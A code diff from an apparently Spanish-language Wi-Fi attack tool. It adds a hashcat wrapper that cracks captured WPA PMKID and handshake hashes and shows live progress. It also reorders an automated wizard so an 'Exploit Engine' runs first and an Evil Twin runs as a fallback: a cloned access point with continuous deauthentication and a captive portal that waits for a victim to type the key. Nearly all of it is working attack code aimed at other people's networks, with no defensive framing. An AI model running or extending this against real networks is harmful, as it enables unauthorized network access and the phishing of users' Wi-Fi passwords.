@@ -294,6 +294,95 @@ def progress_bar(segundos, msg="Capturando"):
     print()
 
 # ─────────────────────────────────────────────────────────────────────────────
+# Hashcat con estadísticas en tiempo real
+# ─────────────────────────────────────────────────────────────────────────────
+def _hashcat_tracked(eng, hash_file, wordlist, extra_flags, label, timeout_sec=300):
+    """
+    Corre hashcat mostrando en tiempo real:
+      - Contraseñas probadas / total
+      - Velocidad (H/s)
+      - Tiempo estimado restante
+    Retorna el output de 'hashcat --show' o "" si no crackeó.
+    """
+    # Contar total de contraseñas en el wordlist
+    total_wl = 0
+    try:
+        with open(wordlist, "r", errors="ignore") as _wf:
+            for _ in _wf:
+                total_wl += 1
+    except Exception:
+        pass
+
+    total_str = f"{total_wl:,}" if total_wl else "?"
+    eng.set_status(f"{label} · 0 probadas / {total_str} · iniciando…")
+
+    cmd = (f"timeout {timeout_sec} hashcat -m 22000 -O {hash_file} {wordlist} "
+           f"{extra_flags} --force --machine-readable --status --status-timer=3 "
+           f"--quiet 2>/dev/null")
+
+    proc = subprocess.Popen(
+        cmd, shell=True,
+        stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
+        stdin=subprocess.DEVNULL, text=True, errors="replace", bufsize=1
+    )
+
+    tried = 0
+    speed = 0
+    found_line = ""
+
+    try:
+        for line in proc.stdout:
+            line = line.strip()
+            if not line:
+                continue
+            parts = line.split("\t")
+            # Línea de status machine-readable: STATUS\t<n>\tSPEED\t...
+            if parts[0] == "STATUS" and len(parts) > 4:
+                try:
+                    si = parts.index("SPEED")
+                    speed = int(parts[si + 1])
+                except (ValueError, IndexError):
+                    pass
+                try:
+                    pi = parts.index("PROGRESS")
+                    tried = int(parts[pi + 1])
+                    total_wl = int(parts[pi + 2]) or total_wl
+                except (ValueError, IndexError):
+                    pass
+                pct = f"{tried/total_wl*100:.1f}%" if total_wl else "?%"
+                eta = ""
+                if speed > 0 and total_wl > tried:
+                    secs_left = (total_wl - tried) // speed
+                    eta = f" · ETA {secs_left//60}m{secs_left%60:02d}s"
+                eng.set_status(
+                    f"{label} · {tried:,}/{total_wl:,} ({pct}) · {speed:,}/s{eta}"
+                )
+            elif ":" in line and not line.startswith("STATUS"):
+                # Posible línea de contraseña crackeada: hash:password
+                found_line = line
+    except Exception:
+        pass
+
+    try:
+        proc.wait(timeout=10)
+    except Exception:
+        proc.kill()
+
+    # Verificar potfile
+    pot = run(f"hashcat --show --quiet -m 22000 {hash_file} 2>/dev/null",
+              capture=True) or ""
+
+    if pot:
+        # Parsear contraseña del potfile
+        pm = re.search(r':([^:\n]+)$', pot, re.MULTILINE)
+        clave = pm.group(1).strip() if pm else ""
+        eng.set_status(f"{label} · ✔ ENCONTRADA: {clave} ({tried:,} probadas)")
+    else:
+        eng.set_status(f"{label} · {tried:,}/{total_wl:,} probadas — no encontrada")
+
+    return pot
+
+# ─────────────────────────────────────────────────────────────────────────────
 # Helpers de sistema
 # ─────────────────────────────────────────────────────────────────────────────
 def run(cmd, capture=False):
@@ -1070,38 +1159,39 @@ def modo_wizard():
     # ─────────────────────────────────────────────────────────────────────────
     else:
         # ── Evil Twin en background ────────────────────────────────────────
-        step(step_n, "Lanzando Evil Twin en background + Exploit Engine")
-        print(f"  {DIM}Ambos ataques corren simultáneamente — gana el primero en obtener la clave.{END}\n")
+        step(step_n, "Lanzando Exploit Engine (10 fases) → Evil Twin si falla")
+        print(f"  {DIM}Exploit Engine primero — si no logra la clave, activa Evil Twin.{END}\n")
 
-        _twin_result = {"clave": None}
-        _twin_stop   = _thr.Event()
+        # ── Exploit Engine primero (evita OOM de correr ambos simultáneamente) ─
+        eng = ExploitEngine(essid, bssid, channel, mon_iface, wordlist)
+        clave, metodo = smart_exploit_target(eng)
 
-        def _twin_worker():
-            if check_tool("airbase-ng") and check_tool("dnsmasq"):
+        # ── Evil Twin solo si Engine falló ─────────────────────────────────────
+        if not clave and check_tool("airbase-ng") and check_tool("dnsmasq"):
+            _twin_result = {"clave": None}
+            _twin_stop   = _thr.Event()
+
+            def _twin_worker():
                 c = _evil_twin_monitor(essid, bssid, channel, mon_iface,
                                        stop_event=_twin_stop, timeout_s=3600)
                 if c:
                     _twin_result["clave"] = c
                     _live_results_append(essid, bssid, c, "Evil Twin — portal cautivo")
 
-        _thr.Thread(target=_twin_worker, daemon=True).start()
-        if check_tool("airbase-ng"):
-            ok(f"Evil Twin activo — AP '{CYAN}{essid}{END}' clonado, deauth continuo")
-        print()
-
-        # ── Exploit Engine (10 fases) ──────────────────────────────────────
-        eng = ExploitEngine(essid, bssid, channel, mon_iface, wordlist)
-        clave, metodo = smart_exploit_target(eng)
+            _thr.Thread(target=_twin_worker, daemon=True).start()
+            ok(f"Evil Twin activo — AP '{CYAN}{essid}{END}' clonado, esperando víctima...")
 
         # ── Detener Engine y Evil Twin ─────────────────────────────────────
         if not eng._stop.is_set():
             eng.done(clave, metodo)   # para el display thread limpiamente
-        _twin_stop.set()
-        time.sleep(1)
 
-        if not clave and _twin_result["clave"]:
-            clave  = _twin_result["clave"]
-            metodo = "Evil Twin — portal cautivo"
+        # Detener Evil Twin si estaba corriendo
+        if not clave and "_twin_stop" in dir():
+            _twin_stop.set()
+            time.sleep(1)
+            if _twin_result.get("clave"):
+                clave  = _twin_result["clave"]
+                metodo = "Evil Twin — portal cautivo"
 
         # ── Kr00k (si el AP usa chip Broadcom/Cypress) ─────────────────────
         if not clave:
@@ -6565,11 +6655,8 @@ def smart_exploit_target(eng: ExploitEngine) -> tuple:
                     if not wl or not os.path.exists(wl): continue
                     wl_name = os.path.basename(wl)
                     rule_name = os.path.basename(available_rules[0]) if available_rules else "sin regla"
-                    eng.set_status(f"hashcat PMKID · {wl_name} + {rule_name} (max 300s)…")
-                    run(f"timeout 300 hashcat -m 22000 -O {pmkid_hc} {wl} {rule_arg} "
-                        f"--force --quiet 2>/dev/null")
-                    pot = run(f"hashcat --show --quiet -m 22000 {pmkid_hc} 2>/dev/null",
-                              capture=True) or ""
+                    label = f"PMKID · {wl_name} + {rule_name}"
+                    pot = _hashcat_tracked(eng, pmkid_hc, wl, rule_arg, label, timeout_sec=300)
                     pm = re.search(r':([^:\n]+)$', pot, re.MULTILINE)
                     if pm:
                         clave  = pm.group(1).strip()
@@ -6671,9 +6758,7 @@ def smart_exploit_target(eng: ExploitEngine) -> tuple:
         if os.path.exists(ssid_wl) and check_tool("hashcat") and \
                 os.path.exists(hc_file) and os.path.getsize(hc_file) > 0:
             eng.update_phase(20)
-            eng.set_status(f"hashcat Ronda 1 · wordlist SSID personalizada (max 60s)…")
-            run(f"timeout 60 hashcat -m 22000 -O {hc_file} {ssid_wl} --force --quiet 2>/dev/null")
-            pot = run(f"hashcat --show --quiet -m 22000 {hc_file} 2>/dev/null", capture=True) or ""
+            pot = _hashcat_tracked(eng, hc_file, ssid_wl, "", "HS Ronda 1 · SSID wordlist", timeout_sec=60)
             pm = re.search(r':([^:\n]+)$', pot, re.MULTILINE)
             if pm:
                 clave = pm.group(1).strip(); metodo = "Handshake + SSID wordlist"
@@ -6686,17 +6771,13 @@ def smart_exploit_target(eng: ExploitEngine) -> tuple:
             for ri, rule in enumerate(available_rules or [""]):
                 eng.update_phase(35 + ri * 15)
                 rf = f"-r {rule}" if rule else ""
-                wl_name   = os.path.basename(wordlist)
                 rule_name = os.path.basename(rule) if rule else "sin regla"
-                eng.set_status(f"hashcat Ronda 2 · {wl_name} + {rule_name} (max 300s)…")
-                run(f"timeout 300 hashcat -m 22000 -O {hc_file} {wordlist} {rf} "
-                    f"--force --quiet 2>/dev/null")
-                pot = run(f"hashcat --show --quiet -m 22000 {hc_file} 2>/dev/null",
-                          capture=True) or ""
+                pot = _hashcat_tracked(eng, hc_file, wordlist, rf,
+                                       f"HS Ronda 2 · {rule_name}", timeout_sec=300)
                 pm = re.search(r':([^:\n]+)$', pot, re.MULTILINE)
                 if pm:
                     clave = pm.group(1).strip()
-                    metodo = f"Handshake + hashcat ({os.path.basename(rule) if rule else 'sin regla'})"
+                    metodo = f"Handshake + hashcat ({rule_name})"
                     eng.done(clave, metodo); return clave, metodo
 
         # Ronda 3: aircrack-ng fallback
